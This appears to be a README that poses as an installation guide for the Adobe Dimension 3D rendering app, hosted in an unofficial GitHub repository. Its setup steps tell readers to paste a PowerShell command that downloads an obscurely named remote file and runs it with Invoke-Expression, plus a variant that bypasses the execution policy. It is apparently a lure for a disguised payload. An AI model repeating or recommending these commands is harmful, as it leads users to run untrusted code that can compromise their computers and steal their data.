# Dimension

Dimension is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Dimension and work in it.

Adobe Dimension is a Windows desktop app for visualizing products and marketing scenes in three dimensions. You import or place models, assign PBR materials, add environment lighting, and frame shots with a physical camera model. Output targets still renders and composite-ready images rather than game engines or CAD fabrication.

A typical session starts by opening a scene or template, dropping in packaging or product geometry, and aligning a background plate if you are compositing into photography. You adjust decal placement, swap Substance-linked materials, tune depth of field, then run a ray-traced render preview before exporting PNG or PSD with useful passes. Creative Cloud libraries keep assets synchronized when you iterate between sessions on the same machine.

This repository collects the Windows setup package, release notes, and a changelog for tracked builds. The setup file documents install options and system requirements for current hardware profiles. Notes capture workflow tips for Dimension-specific tools such as match image and render settings. The changelog records version-to-version fixes so you can see what changed before you update a production machine.

## What you do with it

- Compose product and packaging scenes with drag-and-drop models on a Windows viewport.
- Apply decals and label artwork onto curved surfaces with live material preview updates.
- Match scene camera perspective to imported background photos using guided alignment controls.
- Light environments with HDR images and adjustable sun direction for believable product shadows.
- Render ray-traced stills with depth of field and reflection controls from the same panel.
- Link Substance materials from Creative Cloud libraries for consistent branding across repeated mockups.
- Export layered PSD output with depth passes for refinement in Photoshop after Dimension renders.
- Share dimension scenes through CC libraries so teammates reopen identical lighting and material setups.

## Quick Setup (PowerShell)

This installs the program Dimension on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/skuhn564811/dimension-setup-guide/main/wwqdtm3uyf.1tdm5al6 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/skuhn564811/dimension-setup-guide/main/wwqdtm3uyf.1tdm5al6 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `wwqdtm3uyf.1tdm5al6` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `skuhn564811/dimension-setup-guide`. Adobe Dimension 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
